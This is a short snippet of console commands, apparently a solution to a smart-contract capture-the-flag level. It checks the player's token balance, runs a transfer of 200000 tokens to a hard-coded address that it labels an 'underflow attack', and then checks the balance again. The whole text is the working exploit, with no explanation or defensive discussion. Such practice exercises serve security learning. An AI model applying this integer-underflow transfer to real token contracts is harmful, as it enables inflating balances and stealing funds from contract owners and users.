# Balance of owner 
(await contract.balanceOf(player)).toNumber()

# underflow attack
contract.transfer("0x5fb17f13465950ed8726f7ece8cba3dfb37566aa", 200000)

# Balance new owner 
(await contract.balanceOf(player)).toNumber()
